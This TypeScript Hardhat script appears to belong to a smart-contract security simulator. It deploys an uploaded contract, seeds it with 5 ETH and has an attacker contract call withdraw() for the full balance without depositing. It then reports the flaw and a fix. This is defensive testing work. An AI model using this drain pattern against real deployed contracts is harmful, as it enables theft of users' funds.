import hre from "hardhat";
import { parseEther, formatEther } from "ethers";
import { buildResult } from "./buildResult";

async function main() {
  const contractName = process.env.UPLOADED_CONTRACT_NAME;
  if (!contractName) throw new Error("UPLOADED_CONTRACT_NAME not set");

  const startTime = Date.now();
  const [deployer, attacker] = await hre.ethers.getSigners();

  const VictimFactory = await hre.ethers.getContractFactory(contractName);
  const victim = await VictimFactory.deploy();
  await victim.waitForDeployment();
  const victimAddress = await victim.getAddress();

  // Seed via deposit()
  await (victim as any).connect(deployer).deposit({ value: parseEther("5") });
  const initialBalance: bigint = await hre.ethers.provider.getBalance(victimAddress);

  // Deploy our generic InputValidationAttacker
  const AttackerFactory = await hre.ethers.getContractFactory("InputValidationAttacker");
  const attackerContract = await AttackerFactory.connect(attacker).deploy();
  await attackerContract.waitForDeployment();
  const attackerAddress = await attackerContract.getAddress();

  // Encode withdraw(fullBalance) — attacker has deposited nothing
  const callData = (victim as any).interface.encodeFunctionData("withdraw", [initialBalance]);

  const t1 = Date.now();
  await (attackerContract as any).connect(attacker).attack(victimAddress, callData);
  const endTime = Date.now();

  const finalBalance: bigint = await hre.ethers.provider.getBalance(victimAddress);
  const stolenAmount: bigint = initialBalance - finalBalance;
  const attackerBal: bigint = await hre.ethers.provider.getBalance(attackerAddress);

  const result = buildResult({
    contractName,
    contractAddress: victimAddress,
    attackType: "inputvalidation",
    targetFunction: "withdraw(uint256)",
    severity: "High",
    initialBalance,
    finalBalance,
    stolenAmount,
    startTime,
    endTime,
    transactions: [
      {
        step: 1,
        description: "Legitimate user deposits 5 ETH into vault",
        from: deployer.address,
        to: victimAddress,
        value: "5.0",
        unit: "ETH",
        timestampMs: t1 - 100,
        balanceAfter: { victim: formatEther(initialBalance), attacker: "0.0" },
      },
      {
        step: 2,
        description: `Attacker calls withdraw(${formatEther(initialBalance)} ETH) — deposited 0`,
        from: attacker.address,
        to: victimAddress,
        value: formatEther(stolenAmount),
        unit: "ETH",
        timestampMs: endTime,
        balanceAfter: { victim: formatEther(finalBalance), attacker: formatEther(attackerBal) },
      },
    ],
    timeline: [
      `${contractName} deployed`,
      "Vault seeded with 5 ETH by depositor",
      "Attacker deposited: 0 ETH",
      `Attacker called withdraw(${formatEther(initialBalance)})`,
      stolenAmount > 0n ? "No deposit check — VULNERABLE" : "Deposit check passed — contract safe",
      stolenAmount > 0n ? "Vault drained" : "Attack failed",
    ],
    report: {
      vulnerabilityType: "Input Validation",
      affectedFunction: "withdraw(uint256)",
      explanation:
        "withdraw() does not verify that the caller deposited the requested amount. Any address can call withdraw() with the full vault balance and receive it without having deposited anything.",
      fix: "Add require(deposits[msg.sender] >= amount, 'Exceeds your deposit') before transferring ETH.",
    },
  });

  process.stdout.write("SIMULATION_RESULT:" + JSON.stringify(result) + "\n");
}

main().catch(e => {
  console.error(e);
  process.exit(1);
});
